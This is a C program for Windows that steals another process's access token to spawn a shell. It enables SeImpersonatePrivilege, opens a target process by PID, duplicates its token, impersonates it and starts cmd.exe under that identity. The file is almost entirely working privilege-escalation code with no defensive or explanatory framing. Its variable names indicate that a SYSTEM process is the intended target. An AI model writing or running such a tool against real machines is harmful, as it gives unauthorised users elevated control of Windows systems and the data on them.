#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>

BOOL EnablePrivilege(HANDLE hToken, LPCWSTR pwszPrivilege)
{
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(NULL, pwszPrivilege, &luid))
    {
        printf("[-] LookupPrivilegeValue failed. Error: %d\n", GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
    {
        printf("[-] AdjustTokenPrivileges failed. Error: %d\n", GetLastError());
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
    {
        printf("[-] The token does not have the specified privilege. Error: %d\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

int main(int argc, char** argv) {
    // Check the arguments
    if (argc < 2) {
        printf("Usage: %s PID\n", argv[0]);
        return -1;
    }

    // Get the PID
    char* pid_c = argv[1];
    DWORD systemProcessId = atoi(pid_c);

    // Open the current process token
    HANDLE hCurrentProcessToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hCurrentProcessToken))
    {
        printf("[-] OpenProcessToken failed. Error: %d\n", GetLastError());
        return -1;
    }

    // Enable the specified privilege
    if (EnablePrivilege(hCurrentProcessToken, SE_IMPERSONATE_NAME))
    {
        printf("[+] SeImpersonatePrivilege enabled!\n");
    }

    // Open the token of the target process
    HANDLE hSystemProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, systemProcessId);
    if (!hSystemProcess)
    {
        printf("[-] OpenProcess failed. Error: %d\n", GetLastError());
        CloseHandle(hSystemProcess);
        return -1;
    }
    else {
        printf("[+] Process successfully opened!\n");
    }

    // Open the token of the target process
    HANDLE hSystemToken;
    if (!OpenProcessToken(hSystemProcess, MAXIMUM_ALLOWED, &hSystemToken))
    {
        printf("[-] OpenProcessToken failed. Error: %d\n", GetLastError());
        CloseHandle(hSystemProcess);
        return -1;
    }
    else {
        printf("[+] New Process Token successfully opened!\n");
    }

    // Impersonate as the logged on user
    if (!ImpersonateLoggedOnUser(hSystemToken))
    {
        printf("[-] ImpersonateLoggedOnUser failed. Error: %d\n", GetLastError());
        CloseHandle(hSystemToken);
        CloseHandle(hSystemProcess);
        return -1;
    }
    else {
        printf("[+] Impersonation Successful!\n");
    }

    // Duplicate the token
    HANDLE duplicateTokenHandle = NULL;
    if (!DuplicateTokenEx(hSystemToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle))
    {
        printf("[-] DuplicateTokenEx failed. Error: %d\n", GetLastError());
        CloseHandle(hSystemToken);
        return -1;
    }
    else {
        printf("[+] TokenEx Duplicated!\n");
    }

    // Create a new process as the target user
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;

    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);

    if (!CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, NULL, (LPWSTR)L"cmd.exe", CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
    {
        printf("[-] CreateProcessWithTokenW failed. Error: %d\n", GetLastError());
        CloseHandle(hSystemToken);
        CloseHandle(hSystemProcess);
        return -1;
    }
    else {
        printf("[+] New Process Successfully opened with Duplicated Token!\nProcess Spawning...\n");
    }

    // Close the handles
    CloseHandle(hSystemToken);
    CloseHandle(hSystemProcess);

    return 0;
}
